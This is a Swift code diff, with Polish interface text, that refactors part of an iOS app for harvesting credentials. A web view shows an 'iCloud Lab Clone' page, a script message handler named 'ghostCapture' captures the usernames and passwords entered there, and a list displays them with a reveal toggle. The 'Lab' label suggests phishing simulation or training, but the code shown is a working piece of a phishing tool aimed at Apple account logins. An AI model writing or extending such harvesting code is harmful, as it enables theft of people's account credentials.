@@ -3,9 +3,9 @@ import WebKit
 
 struct CredentialHarvesterView: View {
     @EnvironmentObject var appState: AppState
-    @ObservedObject private var credentialStore = CredentialStore.shared
     @State private var showHarvester = false
     @State private var revealedIDs: Set<UUID> = []
+    @State private var items: [HarvestedCredential] = []
 
     var body: some View {
         ScrollView(showsIndicators: false) {
@@ -20,70 +20,77 @@ struct CredentialHarvesterView: View {
                 }
                 .buttonStyle(NeonFillButtonStyle())
                 .sheet(isPresented: $showHarvester) {
-                    HarvesterWebView()
+                    HarvesterWebView(onCapture: refreshItems)
                 }
 
                 Text("Zapisane dane")
                     .foregroundColor(GhostTheme.neonPinkLight)
 
-                HarvesterItemsList(
-                    items: credentialStore.harvestedItems,
-                    revealedIDs: $revealedIDs
-                )
+                if items.isEmpty {
+                    Text("Brak przechwyconych danych")
+                        .font(.caption)
+                        .foregroundColor(GhostTheme.textSecondary)
+                } else {
+                    ForEach(items.indices, id: \.self) { index in
+                        credentialRow(items[index])
+                    }
+                }
             }
             .padding()
             .padding(.bottom, 40)
         }
         .background(GhostTheme.background)
+        .onAppear(perform: refreshItems)
+        .onReceive(CredentialStore.shared.$harvestedItems) { _ in
+            refreshItems()
+        }
     }
-}
 
-/// Osobny widok – ForEach nie może bezpośrednio brać @Published z @ObservedObject (SwiftUI wybiera Binding).
-private struct HarvesterItemsList: View {
-    let items: [HarvestedCredential]
-    @Binding var revealedIDs: Set<UUID>
+    private func refreshItems() {
+        items = CredentialStore.shared.harvestedItems
+    }
 
-    var body: some View {
-        ForEach(items) { cred in
-            HStack {
-                VStack(alignment: .leading) {
-                    Text(cred.username).foregroundColor(GhostTheme.textPrimary)
-                    if revealedIDs.contains(cred.id) {
-                        Text(cred.password)
-                            .font(.system(.caption, design: .monospaced))
-                            .foregroundColor(GhostTheme.neonPink)
-                    } else {
-                        Text("••••••••")
-                            .foregroundColor(GhostTheme.textSecondary)
-                    }
-                    Text(cred.capturedAt, style: .dateTime)
-                        .font(.caption2)
+    @ViewBuilder
+    private func credentialRow(_ cred: HarvestedCredential) -> some View {
+        HStack {
+            VStack(alignment: .leading) {
+                Text(cred.username).foregroundColor(GhostTheme.textPrimary)
+                if revealedIDs.contains(cred.id) {
+                    Text(cred.password)
+                        .font(.system(.caption, design: .monospaced))
+                        .foregroundColor(GhostTheme.neonPink)
+                } else {
+                    Text("••••••••")
                         .foregroundColor(GhostTheme.textSecondary)
                 }
-                Spacer()
-                Button {
-                    if revealedIDs.contains(cred.id) {
-                        revealedIDs.remove(cred.id)
-                    } else {
-                        revealedIDs.insert(cred.id)
-                    }
-                } label: {
-                    Image(systemName: revealedIDs.contains(cred.id) ? "eye.slash.fill" : "eye.fill")
-                        .foregroundColor(GhostTheme.neonPink)
-                }
+                Text(cred.capturedAt, style: .dateTime)
+                    .font(.caption2)
+                    .foregroundColor(GhostTheme.textSecondary)
             }
-            .padding()
-            .neonBorder()
+            Spacer()
+            Button {
+                if revealedIDs.contains(cred.id) {
+                    revealedIDs.remove(cred.id)
+                } else {
+                    revealedIDs.insert(cred.id)
+                }
+            } label: {
+                Image(systemName: revealedIDs.contains(cred.id) ? "eye.slash.fill" : "eye.fill")
+                    .foregroundColor(GhostTheme.neonPink)
+            }
         }
+        .padding()
+        .neonBorder()
     }
 }
 
 struct HarvesterWebView: View {
     @Environment(\.dismiss) private var dismiss
+    var onCapture: () -> Void = {}
 
     var body: some View {
         NavigationView {
-            WebViewRepresentable()
+            WebViewRepresentable(onCapture: onCapture)
                 .navigationTitle("iCloud Lab Clone")
                 .navigationBarTitleDisplayMode(.inline)
                 .toolbar {
@@ -97,7 +104,11 @@ struct HarvesterWebView: View {
 }
 
 struct WebViewRepresentable: UIViewRepresentable {
-    func makeCoordinator() -> Coordinator { Coordinator() }
+    var onCapture: () -> Void = {}
+
+    func makeCoordinator() -> Coordinator {
+        Coordinator(onCapture: onCapture)
+    }
 
     func makeUIView(context: Context) -> WKWebView {
         let config = WKWebViewConfiguration()
@@ -115,12 +126,19 @@ struct WebViewRepresentable: UIViewRepresentable {
     func updateUIView(_ uiView: WKWebView, context: Context) {}
 
     final class Coordinator: NSObject, WKScriptMessageHandler {
+        let onCapture: () -> Void
+
+        init(onCapture: @escaping () -> Void) {
+            self.onCapture = onCapture
+        }
+
         func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
             guard message.name == "ghostCapture",
                   let body = message.body as? [String: String],
                   let user = body["username"],
                   let pass = body["password"] else { return }
             CredentialStore.shared.add(username: user, password: pass)
+            onCapture()
         }
     }
 
